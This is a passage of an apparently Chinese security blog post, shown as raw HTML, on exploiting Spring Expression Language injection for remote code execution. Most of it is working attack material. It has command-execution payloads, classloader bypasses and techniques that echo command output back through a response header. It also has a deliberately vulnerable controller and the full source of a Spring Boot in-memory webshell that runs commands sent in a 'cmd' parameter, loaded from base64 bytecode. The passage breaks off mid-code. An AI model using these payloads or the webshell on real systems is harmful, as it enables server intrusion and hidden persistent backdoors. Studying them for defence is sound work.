punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><p>è·å–classloaderå…³é”®å­—ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span>Expression</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#thymeleaf æƒ…å†µä¸‹<span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>thymeleaf<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span>AbstractEngineContext</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#webæœåŠ¡ä¸‹é€šè¿‡å†…ç½®å¯¹è±¡<span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>\"<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>\"getRuntime\"<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>\"touch<span class="token operator">/</span>tmp<span class="token operator">/</span>foobar\"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>username<span class="token punctuation">[</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('xterm')"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>asdf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="RCE-ver3â€”â€”å›æ˜¾"><a href="#RCE-ver3â€”â€”å›æ˜¾" class="headerlink" title="RCE ver3â€”â€”å›æ˜¾"></a>RCE ver3â€”â€”å›æ˜¾</h2><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span></span><span class="token class-name">SpelParserConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶å®è¿™å¹¶ä¸æ˜¯çº¯ç²¹çš„å›æ˜¾ï¼Œå› ä¸ºä½ éœ€è¦returnè¿™ä¸ªè¿”å›ç»“æœï¼Œè€ŒçœŸå®æƒ…å†µä¸€èˆ¬æ˜¯ä¸ä¼šreturnè¿™ä¸ªç»“æœçš„</p><hr><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"dir"</span><span class="token punctuation">,</span> <span class="token string">".\\"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"asdasdasdasd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œçš„<code>Delimiter</code>æ˜¯åˆ†éš”ç¬¦çš„æ„æ€ï¼Œæˆ‘ä»¬æ‰§è¡Œäº†diræŒ‡ä»¤ï¼Œå‡å¦‚æƒ³è®©å›æ˜¾å…¨éƒ¨æ˜¾ç¤ºåœ¨ä¸€è¡Œã€‚é‚£ä¹ˆæˆ‘ä»¬ç»™ä¸€ç‚¹ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿å³å¯</p><hr><h3 id="ResponseHeader"><a href="#ResponseHeader" class="headerlink" title="ResponseHeader"></a>ResponseHeader</h3><p>é€šç”¨å›æ˜¾</p><p>è¿™ç§æ–¹æ³•éœ€è¦æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥<code>addHeader</code>ï¼Œå¯æ˜¯springbootå¹¶ä¸è‡ªå¸¦è¿™ä¸ªæ–¹æ³•ã€‚å› æ­¤è·å–åˆ°Responseæœ‰äº›è®¸å›°éš¾ï¼Œéœ€è¦æ³¨å†Œä¸€ä¸ªresponseè¿›ä¸Šä¸‹æ–‡</p><p>ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> spelcontroller <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/spel"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">spelvul</span><span class="token punctuation">(</span><span class="token class-name">String</span> payload<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">StandardEvaluationContext</span> context<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">setVariable</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpelParserConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">payload<span class="token operator">=</span>#response<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token char">'x-cmd'</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯åœ¨å“åº”ä½“é‡Œé¢å°±ä¼šå¸¦å‡º<code>x-cmd</code>è¿™ä¸ªå‚æ•°</p><hr><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span>ReflectUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>'<span class="token class-name">InceptorMemShell</span>'<span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64Utils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeFromString</span><span class="token punctuation">(</span>'yv66vgAAA<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥å°±é€æ­¥è§£æä¸€ä¸‹è¿™ä¸ªpayloadï¼š</p><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç¡®è®¤æˆ‘ä»¬çš„ç›®çš„ï¼Œæˆ‘ä»¬ç›®çš„å°±æ˜¯åŠ è½½ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”å°†å…¶å®ä¾‹åŒ–ã€‚è¿™é‡Œé€‰æ‹©äº†springbootè‡ªå¸¦çš„å·¥å…·ç±»<code>ReflectUtils</code>ï¼Œå› ä¸ºä»–è¯†åˆ«base64å­—èŠ‚ï¼Œç„¶ååŠ è½½å®ƒã€‚å¾ˆæ–¹ä¾¿ã€‚</p><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>åŠ è½½ä¸€ä¸ªç±»éœ€è¦æŒ‡å®šclassloaderï¼Œæˆ‘ä»¬è‚¯å®šé€‰å®šå½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡çš„classLoader<br><code>T(java.lang.Thread).currentThread().getContextClassLoader()</code></p><p>ç¬¬ä¸€ä¸ªpayloadç”¨åˆ°äº†MLetè¿™ä¸ªç±»ï¼Œå®é™…ä¸Šæ˜¯URLClassLoaderçš„å®ç°ç±»</p><hr><h3 id="springbootå†…å­˜é©¬"><a href="#springbootå†…å­˜é©¬" class="headerlink" title="springbootå†…å­˜é©¬"></a>springbootå†…å­˜é©¬</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">HandlerInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">RequestContextHolder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span></span><span class="token class-name">AbstractHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMappingHandlerMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InceptorMemShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"staart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebApplicationContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationContext</span><span class="token punctuation">)</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RequestMappingHandlerMapping</span> mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">RequestMappingHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            field <span class="token operator">=</span> <span class="token class-name">AbstractHandlerMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"adaptedInterceptors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span> adaptInterceptors <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            adaptInterceptors <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerInterceptor</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">InceptorMemShell</span> evilInterceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InceptorMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        adaptInterceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>evilInterceptor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>PrintWriter</span> printWriter <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ProcessBuilder</span> builder<span class="token punctuation">;</span>                <span class="token class-name">String</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token 